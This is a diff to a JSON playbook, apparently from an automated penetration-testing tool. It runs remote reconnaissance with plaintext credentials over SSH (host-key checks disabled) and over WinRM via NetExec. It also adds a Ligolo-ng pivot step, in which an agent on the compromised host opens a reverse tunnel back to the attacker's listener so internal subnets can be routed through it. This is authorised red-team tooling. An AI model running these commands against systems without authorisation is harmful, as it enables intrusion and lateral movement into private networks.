@@ -29,7 +29,8 @@
           "note": "Use the validated plaintext credential to run a non-interactive interface check over SSH.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} ip -o addr show"
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-linux-routes",
@@ -53,7 +54,8 @@
           "note": "Collect route table evidence without claiming the route is reachable through a working pivot yet.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} ip route"
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-linux-neighbors",
@@ -77,7 +79,8 @@
           "note": "Record observed neighbors as host-scoped hints only.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} ip neigh show"
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-linux-dns",
@@ -101,7 +104,8 @@
           "note": "Read resolver configuration through the existing non-interactive SSH channel.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} cat /etc/resolv.conf"
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-windows-interfaces",
@@ -125,7 +129,8 @@
           "note": "Use WinRM exec through NetExec so output is captured and parsed like every other run.",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"ipconfig /all\""
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-windows-routes",
@@ -149,7 +154,8 @@
           "note": "Collect route evidence only; a route does not prove a working tunnel.",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"route print\""
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-windows-neighbors",
@@ -173,7 +179,8 @@
           "note": "Record neighbor hints without treating them as discovered targets.",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"arp -a\""
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "local-windows-listeners",
@@ -196,6 +203,62 @@
           "tool": "nxc",
           "note": "Capture local listener evidence for later route-aware pivot planning.",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"netstat -ano\""
+        }
+      ],
+      "requires_any": []
+    },
+    {
+      "id": "ligolo-tunnel-pivot",
+      "dcDefer": true,
+      "title": "Ligolo-ng TUN Interface Pivot and Internal Subnet Routing",
+      "hypothesis": "Target foothold has dual-homed network interfaces or access to an internal subnet. Deploying the Ligolo-ng agent establishes a reverse tunnel to the Kali ligolo-proxy, allowing transparent subnet routing via a local TUN interface.",
+      "tool": "ligolo-proxy",
+      "tools": [
+        "ligolo-proxy",
+        "ligolo-agent",
+        "ip"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows",
+        "foothold.linux",
+        "host.multihomed",
+        "scan.local.routes"
+      ],
+      "produces": [
+        "tunnel.route",
+        "pivot.active"
+      ],
+      "priority": 92,
+      "phase": "pivot",
+      "proves": "establishes a live routed TUN interface proxying raw TCP/UDP packets into target internal subnet",
+      "does_not_prove": "compromise of hosts on internal subnet until subsequent enumeration and attacks succeed",
+      "report": {
+        "finding": "Internal Subnet Access Established via Routed TUN Pivot",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/nicocha30/ligolo-ng"
+      ],
+      "commands": [
+        {
+          "tool": "ligolo-proxy",
+          "run": "sudo ip tuntap add user {{kali_user}} mode tun dev ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+          "note": "Initialize ligolo TUN interface on Kali and launch ligolo-proxy listener."
+        },
+        {
+          "tool": "ligolo-agent",
+          "run": "agent.exe -connect {{lhost}}:11601 -ignore-cert",
+          "note": "Execute ligolo agent on foothold host to establish reverse tunnel session back to Kali."
+        },
+        {
+          "tool": "ip",
+          "run": "sudo ip route add {{internal_subnet}} dev ligolo",
+          "note": "Add routing entry directing internal subnet traffic through the active ligolo TUN interface."
         }
       ]
     }
